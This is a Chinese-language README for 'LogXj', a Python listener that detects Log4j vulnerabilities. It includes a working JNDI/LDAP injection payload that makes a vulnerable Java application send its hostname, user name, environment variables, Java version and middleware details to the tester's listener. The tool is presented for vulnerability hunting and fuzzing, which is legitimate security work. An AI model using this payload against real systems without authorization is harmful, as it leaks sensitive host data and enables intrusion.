# LogXj

## 简介
- 用于探测Log4j漏洞, 将它POC的威力最大化, POC验证成功后会立即收到目前机器的系统主机名、时间、版本号、用户名、环境变量以及Log4j路径、java版本号、中间件信息等信息.

## 灵感来源
- 由于不能第一时间立刻知道某应用系统整个组件调用链、数据传输链、系统调用链中是否存在Log4j漏洞，因此经常需要黑盒测试来fuzzing。可以利用存在漏洞的Log4j组件会向攻击者指定的dns服务端发起域名解析请求的特性判断漏洞的存在，但是内网不一定存在dns服务器，即使存在也不一定配置了dns服务器，即使配置了但是通过dnslog这类平台也无法知道是内网中的哪台机器存在漏洞，即使知道了也不确定是那台机器上的哪个web应用存在漏洞，用的是哪个版本的java环境以及哪个中间件。
- 根据自己以上种种痛点写了这个小工具，提高挖洞效率，顺便开源出来。

## 作用
- 监听端口, 等待猎物，被动式发现存在Log4j漏洞的机器.
- 最大化了POC的威力: 可以获取目前机器的系统时间、主机名、Log4j路径、系统版本号、java版本号、系统用户名、中间件信息（含物理路径）、环境变量等敏感信息.
- 功能超越了dnslog和ncat.
- 时刻监听同一端口, 可不限制地接收多个目标传输过来的漏洞信息.
- 收到漏洞信息后立即断开, 避免占用目标的程序线程和网络连接.
- 记录历史, 保存漏洞信息.

## 优点
- 代码开源, 安全可控.
- 不依赖第三方库.
- 跨平台.
- 解决了内网环境没有dns服务器、不通dnslog等问题.
- 解决了内网环境无法下载ncat的问题.
- 解决了ncat命令过于冗余的问题.
- 解决了ncat监听模式下需要频繁ctrl+c才能终止OOB连接的问题.
- 兼容Python2和Python3.
- 解决了fuzzing工程师不清楚fuzzing成功了哪台目标机器的问题.
- 解决了fuzzing工程师不清楚fuzzing成功了目标机器上的哪个web应用的问题.

## 用法
1. 找一台服务器作为ldap服务端(LOGXJ SERVER), 开启TCP服务, 命令如下:
```
python logxj.py
```

2. 攻击端将下述LOGXJ POC发送给使用了log4j的目标(java应用系统), LOGXJ POC如下: 
```shell
${jndi:ldap://127.0.0.1:4444/\nFound Log4j vuln!\nDate\t:${date:yyyy-MM-dd HH:mm:ss}\nHostname:${hostName}\nConf dir:${log4j:configLocation:-}\nOs ver\t:${java:os}\nJava ver:${java:version}\nUser\t:${env:USER:-}${env:USERNAME:-}\nIsTomcat:${env:CATALINA_BASE:-False}\nPATH\t:${env:PATH:-}\n\nEnd}
```

3. 此时观察ldap服务端(LOGXJ SERVER)的控制台:
- 若收到请求, 则说明目标存在log4j漏洞.
- 若无, 则说明可能暂无风险.

